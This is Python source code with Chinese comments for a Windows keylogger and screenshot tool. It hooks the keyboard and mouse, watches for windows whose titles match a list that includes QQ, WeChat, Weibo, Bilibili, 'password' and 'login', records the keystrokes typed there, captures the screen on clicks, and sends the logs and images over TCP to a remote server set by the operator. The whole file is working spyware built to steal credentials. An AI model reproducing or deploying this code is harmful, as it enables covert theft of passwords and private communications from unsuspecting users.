import pythoncom
import PyHook3
import os
import time
import socket
import sys
from PIL import ImageGrab

#------我们用关键词去筛选，软件会在什么时候去监听记录截屏
lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']
MSG=""
save_to=1
title_word=""
global_title=""
runstatus=1
clientSockfd=""
fname_to=""
timelist=[0,0,100,100]
#上面都是全局变量，由于初版本比较早完成，所以大部分都是使用全局变量请谅解。

def init_setting():
    pathlist={'open_filename':'', 'open_pic':'', 'dos_filename':'',
            'dos_pic_dir':'', 'dos_config':'', 'open_config':''}
    ADDRlist={'rADDR':(), 'rHOST':'','rPORT':0, 'picSIZE':0, 'txtSIZE':0, 'encode':''}

    #--------------发包收包编码和BUFSIZE(缓存大小)--------------------------
    ADDRlist['picSIZE'],ADDRlist['txtSIZE']=2048,256 #图片为4096,文本为256
    ADDRlist['encode']='utf-8'

    #-------------建立目录和文件信息-----------------------------
    lhome=os.path.abspath('.')
    lhomelist=lhome.split('\\')
    pathlist['dos_filename']=lhome+'\\QQdata\\data\\Monitor_log.txt'
    pathlist['dos_pic_dir']=lhome+'\\QQdata\\data\\xx11\\'
    pathlist['dos_config']=lhome+'\\'+'Monitor_config.txt'
    for n in range(len(lhomelist)):
        pathlist['open_filename']+=lhomelist[n]+'/'
        pathlist['open_pic']+=lhomelist[n]+'/'
        pathlist['open_config']+=lhomelist[n]+'/'
    pathlist['open_filename']+='QQdata/data/Monitor_log.txt'
    pathlist['open_pic']+='QQdata/data/xx11/'
    pathlist['open_config']+='Monitor_config.txt'

    #-----手动修改Monitor_config.txt文件，如果有配置文件则不需要重复输入IP和端口号
    #----把服务端的配置文件放在客户端同个目录也可，如果配置错误则需要手动删除配置文件。
    if not os.path.exists(pathlist['dos_config']):
        print('未检测出客户端配置文件,请输入新配置信息..........')
        while True:
            if ADDRlist['rHOST'] and ADDRlist['rPORT']:
                break
            if not ADDRlist['rHOST']:
                try:
                    ADDRlist['rHOST']=input('请输入正确的服务器IP地址(如www.xxx.com,xxx.xxx.xxx.xxx):')
                except:
                    print('错误IP格式')
            if not ADDRlist['rPORT']:
                try:
                    ADDRlist['rPORT']=input('请输入正确的服务器端口推荐(6666):')
                except:
                    print('错误端口')
        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
        f=open(pathlist['open_config'],'w')
        f.write(ADDRlist['rHOST']+'\x0A'+ADDRlist['rPORT'])
        f.close()
        print('已成功生成新客户端配置文件......')
    else:
        f=open(pathlist['open_config'], 'r')
        ff=f.read().split()
        ADDRlist['rHOST'],ADDRlist['rPORT']=ff[0],ff[1]
        ADDRlist['rADDR']=(str(ADDRlist['rHOST']),int(ADDRlist['rPORT']))
        f.close()
        print('已存在客户端配置文件，已成功加载配置信息......')
    print('正在生成配置文件')
    times=0
    while True:
        times+=1
        if os.path.exists(pathlist['dos_filename']) and os.path.exists(pathlist['dos_pic_dir']):
            print('成功生成目录数据变量')
            break
        elif times >=5:
            pathlist['open_filename']='D:/QQdata/data/Monitor_log.txt'
            pathlist['open_pic']='D:/QQdata/data/xx11/'
            pathlist['dos_filename']='D:\\QQdata\\data\\Monitor_log.txt'
            pathlist['dos_pic_dir']='D:\\QQdata\\data\\xx11\\'
            print('已经配置默认条件......')
            break

        if not os.path.exists(pathlist['dos_pic_dir']):
            try:
                os.makedirs(pathlist['dos_pic_dir'])
                print('正在生成%s目录' %pathlist['dos_pic_dir'])
            except:
                print('error1>>')
        if not os.path.exists(pathlist['dos_filename']):
            try:
                os.system('type nul >%s' %pathlist['dos_filename'])
                print('正在生成%s文件' %pathlist['dos_filename'])
            except:
                print('error2>>')
    return pathlist, ADDRlist

def runtime(event_time, timelist, status):
    timelist[0]=event_time
    if timelist[0]>timelist[1] and timelist[1]!=0:
        if status=='keyboard':
            timelist[2]+=(timelist[0]-timelist[1])/10**3
        elif status=='mouse':
            timelist[3]+=(timelist[0]-timelist[1])/10**3
    timelist[1]=timelist[0]
    return True

"""
def checkfile(file_name, i, BUFSIZE):
#检测传输数据包的完整性
    j,rate=0,0
    fsize=os.path.getsize(file_name)
    times=int(fsize/BUFSIZE)
    if i<times:
        j=BUFSIZE*i
        rate=int(j/fsize*100+1)
    elif i>=times and rate<100 or fsize<BUFSIZE:
        rate,j=100,fsize
    #返回目前包的大小和完成率
    return j,rate
"""

def sendfile(clientSockfd, file_name, encode, BUFSIZE):
#发送数据包函数到服务端
    #global fname_to
    i=0
    f=open(file_name, 'rb')
    while True:
        msg=f.read(BUFSIZE)
        if not msg:
            break
        """
        else:
            i+=1
            j,rate=checkfile(file_name,i,BUFSIZE)
            print('正在发送',fname_to,'数据包完整性：{}% 大小{}B{}'.format(rate,j,'\x0D'), end='')
            这里为了演示动态传输效果设置了时间延迟，建议注释不然会影响速度和造成卡顿
            time.sleep(0.01)
            """
        clientSockfd.sendall(msg)
    f.close()
    clientSockfd.sendall(bytes('EOF',encoding=encode))
    print('成功发包')
    #print(recv_message(clientSockfd, encode, BUFSIZE))

"""
def recv_message(clientSockfd,encode,BUFSIZE):
#接收数据包并返回其内容，可用于后期远程控制。
    msg=clientSockfd.recv(BUFSIZE)
    if not msg or msg==bytes('EOF',encoding=encode):
        return False
    return msg.decode()
    """

def confirm(clientSockfd, filetype, encode, BUFSIZE):
#确认数据包类型函数
    clientSockfd.send(bytes(filetype, encoding=encode))
    msg=clientSockfd.recv(BUFSIZE)
    if msg==bytes('NO PROBLEM', encoding=encode):
        print('{} NO PROBLEM'.format(filetype))
    return True

def handle(clientSockfd, filename, filetype, encode, BUFSIZE):
#客户端握手函数
    #global MSG
    if filetype=='txt' or filetype=='pic':
        #当发现文件类型为文本或图片就会调用下面确认类型函数。
        if confirm(clientSockfd, filetype, encode, BUFSIZE):
            #如果是成功接收数据包NO PROBLEM则会发送全部数据，也是socket的核心函数集
            sendfile(clientSockfd, filename, encode, BUFSIZE)
            #if filetype=='txt':
                #fname_to=MSG
        else:
            print('{} 发包失败'.format(filetype))
            return False
    else:
        print('文件类型识别失败！')
        return False
    return True

def write_msg_to_txt(msg, pathlist):
    f=open(pathlist['open_filename'],'w')
    f.write(msg+'\x0A')
    f.close()

def get_local_time(press):
#获取时间函数
    if press=='keyboard':
        return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
    else:
        return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))

def get_local_image(pathlist):
#获取截屏并生成当前时间格式存储本地
    #global fname_to
    pic_lists =os.listdir(pathlist['dos_pic_dir'])
    #检测客户端本地存储超过一百张则全部清空
    if len(pic_lists) >10:
        for pl in pic_lists:
            fpath=pathlist['dos_pic_dir']+pl
            if os.path.isfile(fpath):
                os.remove(fpath)
    pic=ImageGrab.grab()
    pic_name=pathlist['open_pic']+'mouse_%s.jpg' %get_local_time("")
    #fname_to='mouse_%s.jpg' %get_local_time("")
    pic.save('%s' %pic_name)
    return pic_name

def onMouseEvent(event):
#hook鼠标监控函数
    global lists
    global MSG
    global global_title
    global pathlist
    global timelist

    mouse_status=event.MessageName
    if timelist[3]<5:
        runtime(event.Time, timelist, 'mouse')
    pic_msg=""
    #当鼠标左键和右键点击的时候回触发,下面截屏和键盘记录函数
    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
        if global_title in lists:
            if MSG!="" and int(timelist[3])>=5:
                write_msg_to_txt(MSG, pathlist)
                handle(clientSockfd, pathlist['open_filename'], 'txt', ADDRlist['encode'], ADDRlist['txtSIZE'])
                get_local_image(pathlist)
                pic_msg=get_local_image(pathlist)
                #write_msg_to_txt(pic_msg, pathlist)
                handle(clientSockfd, pic_msg, 'pic', ADDRlist['encode'], ADDRlist['picSIZE'])
                timelist[3]=0
            global_title=""
    return True

def onKeyboardEvent(event):
#hook键盘监控函数
    global lists
    global MSG
    global title_word
    global global_title
    global pathlist
    global timelist

    words,title='',''
    status, title_status, break_status=1,1,1

    #当前监控的的Ascii十进制数值
    keyid=event.Ascii
    #Ascii十进制32-127以内，部分是无法显示
    keychar=chr(event.Ascii)
    #Ascii明文，大部分都是依靠下面变量去判断
    keyword=event.Key
    #当前窗口如QQ或bilibili的名称
    title=event.WindowName
    #事件发生的时间戳，通过函数计算时间秒速,并将值赋予timelist[2]
    if timelist[2]<5:
        runtime(event.Time, timelist, 'keyboard')

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        global_title=words
                        title_status=0
                        break_status=0
                        break
            if break_status==0:
                break
            words=''
    #下面函数则是键盘记录的核心，我已经绞尽脑汁了。
    if title_status==0:
        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
            and keyword!="Lshift" and keyword!="Rshift"
            ):
            title_word=title
            MSG=get_local_time('keyboard')+title+"窗口: "
        if 127 > keyid >32:
            MSG+=keychar
        else:
            if keyword=="Return":
                MSG+="<回车>"
                status=0
            elif keyword=="Tab":
                MSG+="<水平制表>"
            elif keyword=="Back":
                MSG+="<退格>"
            elif keyword=="Delete":
                MSG+="<删除>"
            elif keyword=="Space":
                MSG+="<空格>"
    if status == 0 and int(timelist[2])>=5:
        if MSG!="":
            #当触发如回车或者一些特殊按键时候则触发记录
            write_msg_to_txt(MSG, pathlist)
            handle(clientSockfd, pathlist['open_filename'], 'txt', ADDRlist['encode'], ADDRlist['txtSIZE'])
            timelist[2]=0
        title_word=""
        global_title=""
        kwords=""
    # 同鼠标事件监听函数的返回值
    return True

def main():
    global runstatus
    global clientSockfd
    global pathlist
    global ADDRlist

    print('正在检测配置文件{}'.format('.'*4))
    pathlist, ADDRlist=init_setting()
    times=0
    print('正在连接服务器......')
    while True:
        ltime=time.strftime('%S',time.localtime(time.time()))
        #每10秒就会尝试连接一次服务器
        if int(ltime)%10==0:
            times+=1
            #超过半小时依旧无法连接则断开
            if times>=180:
                print('已超时半小时，无法连接服务器。')
                sys.exit()
            try:
                #客户端数字传输类型ip4和TCP
                clientSockfd=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                #连接服务器
                clientSockfd.connect(ADDRlist['rADDR'])
                print("已建立连接{}".format('.'*10),ADDRlist['rADDR'])
                runstatus=0
                break
            except socket.error:
                print('无法正常连接:{}，错误:请检查服务器是否开启!!!'.format(str(ADDRlist['rADDR'])))
        else:
            time.sleep(1)
    if runstatus==0:
        # 创建一个“钩子”管理对象
        hm = PyHook3.HookManager()
        # 监听所有鼠标事件钩子
        hm.MouseAll = onMouseEvent
        hm.HookMouse()
        # 监听所有键盘事件钩子
        hm.KeyDown = onKeyboardEvent
        hm.HookKeyboard()
        # 进入循环，如不手动关闭，程序将一直处于监听状态
        pythoncom.PumpMessages()
if __name__ == "__main__":
    main()

